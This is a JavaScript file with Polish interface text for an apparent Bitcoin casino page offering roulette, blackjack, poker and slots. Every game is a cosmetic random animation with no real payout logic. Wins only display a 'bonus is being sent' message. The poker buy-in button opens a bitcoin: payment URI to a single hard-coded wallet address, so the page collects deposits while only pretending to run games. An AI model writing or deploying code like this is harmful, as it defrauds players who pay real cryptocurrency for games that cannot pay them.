const myBTCAddress = "bc1qe25ang24lnk8herylzzhjvdzhkkefxs53ddggd";
const engine = document.getElementById('game-engine-render');
const modal = document.getElementById('game-window');

// --- SYSTEM WYBORU GIER ---
function openGame(gameType) {
    modal.style.display = "block";
    engine.innerHTML = "<p>Inicjowanie systemu...</p>";

    if (gameType === 'roulette') {
        loadRoulette();
    } else if (gameType === 'bj') {
        loadBlackjack();
    } else if (gameType === 'poker') {
        loadPoker();
    } else if (gameType === 'slot') {
        loadSlots();
    }
}

function closeGame() {
    modal.style.display = "none";
}

// --- LOGIKA: RULETKA (CZERWONE/CZARNE) ---
function loadRoulette() {
    engine.innerHTML = `
        <h3>RULETKA LIVE</h3>
        <div id="wheel-display" style="font-size: 50px; margin: 20px;">0</div>
        <div id="status-text">Wybierz kolor i postaw 0.0001 BTC</div>
        <div style="display: flex; gap: 10px; justify-content: center;">
            <button onclick="playRoulette('RED')" style="background:red; color:white; padding:10px;">CZERWONE</button>
            <button onclick="playRoulette('BLACK')" style="background:black; color:white; padding:10px;">CZARNE</button>
        </div>
    `;
}

function playRoulette(betColor) {
    const status = document.getElementById('status-text');
    const display = document.getElementById('wheel-display');
    status.innerText = "Losowanie w toku...";
    
    let count = 0;
    const anim = setInterval(() => {
        display.innerText = Math.floor(Math.random() * 37);
        count++;
        if (count > 20) {
            clearInterval(anim);
            const result = Math.floor(Math.random() * 37);
            const colors = [0, "RED", "BLACK", "RED", "BLACK", "RED", "BLACK", "RED", "BLACK", "RED", "BLACK"]; // uproszczenie
            const winColor = result === 0 ? "GREEN" : (result % 2 === 0 ? "RED" : "BLACK");
            
            display.innerText = result;
            display.style.color = winColor === "RED" ? "#ff4d4d" : (winColor === "BLACK" ? "#fff" : "#00ff00");
            
            if (betColor === winColor) {
                status.innerText = "WYGRANA! System przesyła bonus...";
            } else {
                status.innerText = "PRZEGRANA. Spróbuj ponownie.";
            }
        }
    }, 50);
}

// --- LOGIKA: BLACKJACK ---
function loadBlackjack() {
    engine.innerHTML = `
        <h3>BLACKJACK 21</h3>
        <div id="bj-table">Twoje karty: <span id="player-hand">?</span></div>
        <div id="bj-status">Postaw zakład, aby otrzymać karty</div>
        <button onclick="startBJ()" class="wallet-btn">ROZDAJ KARTY</button>
    `;
}

function startBJ() {
    const pHand = Math.floor(Math.random() * 10) + 12; // Symulacja układu 12-21
    document.getElementById('player-hand').innerText = pHand;
    if (pHand === 21) {
        document.getElementById('bj-status').innerText = "BLACKJACK! Wygrana!";
    } else {
        document.getElementById('bj-status').innerText = "Masz " + pHand + ". Czekamy na krupiera...";
    }
}

// --- LOGIKA: POKER LIVE ---
function loadPoker() {
    engine.innerHTML = `
        <h3>POKER TEXAS HOLDEM</h3>
        <div id="poker-table" style="background: green; padding: 20px; border-radius: 50%;">
            <div id="cards">🎴 🎴 [ ? ] [ ? ] [ ? ]</div>
        </div>
        <p>Wpłać wpisowe (Buy-in), aby dołączyć do stołu.</p>
        <button onclick="window.location.href='bitcoin:${myBTCAddress}?amount=0.0005'" class="wallet-btn">WPŁAĆ 0.0005 BTC</button>
    `;
}

// --- LOGIKA: SLOTY (AUTOMAT) ---
function loadSlots() {
    engine.innerHTML = `
        <h3>777 GOLDEN SLOT</h3>
        <div id="slot-machine" style="font-size: 40px; background: #333; padding: 20px;">[ 🍒 | 🍒 | 🍒 ]</div>
        <button onclick="spinSlots()" class="wallet-btn" style="margin-top:10px;">POCIĄGNIJ DŹWIGNIĘ</button>
    `;
}

function spinSlots() {
    const icons = ["🍒", "🔔", "💎", "7️⃣", "🍋"];
    const slot = document.getElementById('slot-machine');
    let t = 0;
    const int = setInterval(() => {
        slot.innerText = `[ ${icons[Math.floor(Math.random()*5)]} | ${icons[Math.floor(Math.random()*5)]} | ${icons[Math.floor(Math.random()*5)]} ]`;
        t++;
        if(t > 15) clearInterval(int);
    }, 100);
}
